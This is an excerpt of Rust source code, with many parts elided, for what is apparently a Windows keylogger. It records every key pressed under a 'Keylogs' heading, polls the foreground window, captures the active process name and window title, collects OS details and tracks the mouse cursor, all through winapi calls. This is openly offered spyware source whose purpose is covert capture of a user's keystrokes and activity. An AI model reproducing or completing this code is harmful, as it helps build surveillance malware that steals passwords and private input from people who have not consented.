...
use chrono::{DateTime, Timelike, Utc}; //chrono module for recording the date and time
...
pub fn run(file: &mut File) {
    ...
    use winapi::um::psapi::GetProcessImageFileNameW; //this will get the process details that is executing on the system
    ...
    log(file, "\nKeylogs:\n".to_string()); //THESE ARE TAKING TIME AND COMING RANDOMLY

    //logging
    loop {
        thread::sleep(Duration::from_millis(10));

        //the GetForegroundwindow() function will get record of the window the user is working on
        ...
        //opening a process handle with the given process id 
        ...
        let filename = unsafe {
            ...
            //find the null terminator and end the recording there
            let mut len = 0;
            buf.iter().enumerate().for_each(|(i, c)| {
                if *c == 0 && len == 0 {
                    len = i;
        ...
        let title = unsafe {
            let len = GetWindowTextLengthW(hwnd) + 1; //getting the text of the window
...
pub fn rec_activity(file: &mut File) {
    let os_info = {
...
pub fn keycode_to_string(k: u8) -> String { //table for keycode conversion
    ...
    //This table records and gives the key as pressed by the user
}

pub fn get_mouse_pos() -> String {
    use winapi::shared::windef::POINT;
    use winapi::um::winuser::*;

    let pos = unsafe {
        let mut p = POINT { x: -1, y: -1 };
        GetCursorPos(&mut p); //to get the current postion of the cursor so that we can get the VK_LMB and VK_RMB
        p
    };
